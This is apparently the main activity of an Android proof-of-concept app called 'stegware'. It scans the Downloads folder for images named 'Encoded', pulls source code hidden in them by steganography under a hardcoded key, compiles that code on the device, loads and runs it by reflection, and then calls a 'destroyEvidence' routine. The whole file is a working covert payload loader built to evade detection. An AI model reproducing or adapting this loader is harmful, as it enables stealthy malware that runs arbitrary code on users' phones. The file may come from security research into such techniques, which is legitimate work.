package com.android.stegware_app;

import android.Manifest;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.util.Log;
import android.widget.Button;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.android.stegware_app.compile_utility.Compile;
import com.android.stegware_app.compile_utility.exceptions.InvalidSourceCodeException;
import com.android.stegware_app.compile_utility.exceptions.NotBalancedParenthesisException;
import com.android.stegware_app.jobs.MediaSearchJob;
import com.ayush.imagesteganographylibrary.Text.AsyncTaskCallback.TextDecodingCallback;
import com.ayush.imagesteganographylibrary.Text.ImageSteganography;
import com.ayush.imagesteganographylibrary.Text.TextDecoding;

import java.io.File;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;

import dx.command.Main;
import javassist.NotFoundException;

public class MainActivity extends AppCompatActivity implements TextDecodingCallback {

    public static final String TAG = "MainActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        checkAndRequestPermissions();

        try {
            getImage();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    private void checkAndRequestPermissions() {
        int permissionWriteStorage = ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE);
        int ReadPermission = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE);
        List<String> listPermissionsNeeded = new ArrayList<>();

        if (ReadPermission != PackageManager.PERMISSION_GRANTED) {
            listPermissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }

        if (permissionWriteStorage != PackageManager.PERMISSION_GRANTED) {
            listPermissionsNeeded.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }

        if (!listPermissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, listPermissionsNeeded.toArray(new String[0]), 1);
        }
    }

    private void getImage() throws IOException, InterruptedException {
        String path = Environment.getExternalStorageDirectory().toString() + "/" + Environment.DIRECTORY_DOWNLOADS;

        File directory = new File(path);
        File[] files = directory.listFiles();

        if (files != null) {
            for (File file : files) {
                Log.d(TAG, file.getName());
                Log.d(TAG, file.getPath());
                Log.d(TAG, Uri.fromFile(file).toString());

                if (file.getName().contains("Encoded")) { // TODO: Find name for encoded img
                    Bitmap img = MediaStore.Images.Media.getBitmap(getContentResolver(), Uri.fromFile(file));
                    ImageSteganography imageSteganography = new ImageSteganography("a", img); // TODO: Remove hardcoded secret_key

                    TextDecoding textDecoding = new TextDecoding(MainActivity.this, MainActivity.this);

                    //Execute Task
                    textDecoding.execute(imageSteganography);
                }
            }
        }
    }

    private void dynamicCompiling(Context context, String code) {
        Compile compile = new Compile(context.getFilesDir(), context, code);

        try {
            compile.parseSourceCode();
            compile.assemblyCompile();
            compile.compile();
            compile.dynamicLoading(context.getCacheDir(), context.getApplicationInfo(), context.getClassLoader());
            Object obj = compile.run();

            String _result = "";

            Method method = obj.getClass().getDeclaredMethod("run", Context.class);
            _result = (String) method.invoke(obj, context);

            compile.destroyEvidence();

            Log.d(TAG, "Method res: " + _result);
        } catch (NotBalancedParenthesisException | InvalidSourceCodeException | NotFoundException | IOException | InstantiationException | InvocationTargetException | NoSuchMethodException | IllegalAccessException | ClassNotFoundException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onStartTextEncoding() {
        //Whatever you want to do by the start of textDecoding
    }

    @Override
    public void onCompleteTextEncoding(ImageSteganography result) {
        if (result != null) {
            if (!result.isDecoded())
                Log.d(TAG, "No message found");
            else {
                if (!result.isSecretKeyWrong()) {
                    Log.d(TAG, "Decoded");

                    dynamicCompiling(getApplicationContext(), result.getMessage());
                } else {
                    Log.d(TAG, "Wrong secret key");
                }
            }
        } else {
            Log.d(TAG, "Select Image First");
        }
    }
}